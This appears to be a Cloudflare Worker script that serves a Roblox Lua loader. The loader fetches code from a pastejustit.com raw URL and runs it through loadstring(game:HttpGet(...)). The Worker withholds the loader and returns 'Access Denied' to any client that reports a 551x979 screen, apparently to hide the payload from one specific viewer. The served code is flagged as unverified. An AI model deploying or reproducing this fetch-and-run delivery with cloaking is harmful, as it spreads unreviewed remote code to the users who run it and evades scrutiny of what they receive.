addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request))
})

async function handleRequest(request) {
  // Only handle requests to the root ('/') route
  const url = new URL(request.url)
  if (url.pathname !== '/') {
    return new Response('Not Found', { status: 404 })
  }

  // Check if the request method is GET
  if (request.method !== 'GET') {
    return new Response('Method Not Allowed', { status: 405 })
  }

  // Get the custom headers for screen resolution
  const screenWidth = request.headers.get('X-Screen-Width');
  const screenHeight = request.headers.get('X-Screen-Height');

  // Check if screen resolution matches 551x979
  if (screenWidth === '551' && screenHeight === '979') {
    // Deny access if resolution matches
    const htmlContent = `
      <!DOCTYPE html>
      <html lang="en">
      <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Access Denied</title>
        <style>
          body {
            font-family: Arial, sans-serif;
            text-align: center;
            margin-top: 50px;
            color: #333;
          }
          h1 {
            color: #e74c3c;
          }
        </style>
      </head>
      <body>
        <h1>Access Denied</h1>
        <p>Your screen resolution of 551x979 is not allowed to access this resource.</p>
      </body>
      </html>
    `;
    return new Response(htmlContent, {
      headers: { 'Content-Type': 'text/html' },
      status: 403
    });
  }

  // If resolution does not match, proceed with the normal response
  const robloxScript = `
-- Roblox Lua Script
--[[
  WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
loadstring(game:HttpGet("https://pastejustit.com/raw/pk4w9dy7nf"))()
`;

  // Respond with the Roblox Lua script
  return new Response(robloxScript, {
    headers: { 'Content-Type': 'text/plain' }
  });
}
